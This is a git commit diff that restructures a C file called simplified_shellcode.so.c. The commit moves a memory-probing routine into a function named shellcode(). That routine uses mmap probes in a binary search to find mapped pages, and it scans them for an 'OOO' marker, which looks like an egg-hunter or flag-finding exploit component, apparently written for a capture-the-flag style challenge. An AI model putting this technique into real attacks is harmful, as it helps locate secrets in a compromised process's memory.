6d2b9208082a06d8980297db9e0465ee7f60c4c0
Xiang Fu <xfu@xfu.com>
2019-05-11 19:55:12 -0400

    NOW merged into single function in simple.so.c

--- simplified_shellcode.so.c
+++ simplified_shellcode.so.c
@@ -11,59 +11,54 @@
 #define ADDR_MASK  0x00000ffffffff000UL
 
 
-long total = 0;
-void *search(void *ptr){
-	int found = 0;
-	int i = 0;
-	void *oldptr = ptr;
-	void *newptr = NULL;
-	while(found==0){
-		i++;
-		found = 0;
-		//-------------------------------------
-		//binary search for an existing page, upper limit 4096*32 PAGE_SIZE
-		//-------------------------------------
-		unsigned long int right = 4096*32; //that's the max without failing mmap
-		unsigned long int left = 0;
-		while(left<right-1){
-			unsigned long int mid = (right+left)/2;
-			unsigned long int offset = mid*0x1000UL;
-			void *r1 = mmap(ptr, offset, PROT_READ|PROT_WRITE, 
-					MAP_ANONYMOUS|MAP_PRIVATE , -1, 0);
-			if(r1==ptr){//allocate success, means no page there
-				left = mid;
-				munmap(ptr, offset);
-			}else{//allocate failure, means there is some page
-				right = mid;
-				munmap(r1, offset);
-			}
-			if(left==right-1){
-				newptr = ptr + left*0x1000UL; //that's the first addr causing trouble
-				void *r2 = mmap(newptr, 4096, PROT_READ|PROT_WRITE, 
-					MAP_ANONYMOUS|MAP_PRIVATE , -1, 0);
-				if(r2==newptr){//NOT FOUND
-					found = 0;
-					munmap(newptr, 4096);
-				}else{//found existing page
-					found = 1;
-					munmap(r2, 4096);
-				}
-				break;
-			}
-		}//end of while
-		total += i;
-		ptr = newptr;
-	}//end of while found==0
-	return ptr;
-}
-
 void *shellcode()
 {
 	printf("==========================\n");
 	char *ptr = ADDR_MIN ;
 	for(int i=0; i<100; i++){
-		ptr = search(ptr);
-		if(*ptr=='O' && *(ptr+1)=='O'){
+		//----------- search for next page ------------------------
+			int found = 0;
+			int i = 0;
+			void *newptr = NULL;
+			while(found==0){
+				i++;
+				found = 0;
+				//-------------------------------------
+				//binary search for an existing page, upper limit 4096*32 PAGE_SIZE
+				//-------------------------------------
+				unsigned long int right = 4096*32; //that's the max without failing mmap
+				unsigned long int left = 0;
+				while(left<right-1){
+					unsigned long int mid = (right+left)/2;
+					unsigned long int offset = mid*0x1000UL;
+					void *r1 = mmap(ptr, offset, PROT_READ|PROT_WRITE, 
+							MAP_ANONYMOUS|MAP_PRIVATE , -1, 0);
+					if(r1==ptr){//allocate success, means no page there
+						left = mid;
+						munmap(ptr, offset);
+					}else{//allocate failure, means there is some page
+						right = mid;
+						munmap(r1, offset);
+					}
+					if(left==right-1){
+						newptr = ptr + left*0x1000UL; //that's the first addr causing trouble
+						void *r2 = mmap(newptr, 4096, PROT_READ|PROT_WRITE, 
+							MAP_ANONYMOUS|MAP_PRIVATE , -1, 0);
+						if(r2==newptr){//NOT FOUND
+							found = 0;
+							munmap(newptr, 4096);
+						}else{//found existing page
+							found = 1;
+							munmap(r2, 4096);
+						}
+						break;
+					}
+				}//end of while
+				ptr = newptr;
+			}//end of while found==0
+		//AT THIS MOMENT, ptr is a VALID PAGE
+		//----------- end ------------------------
+		if(*ptr=='O' && *(ptr+1)=='O' && *(ptr+2)=='O'){
 			printf("%s\n", ptr);
 			return ptr;
 		}
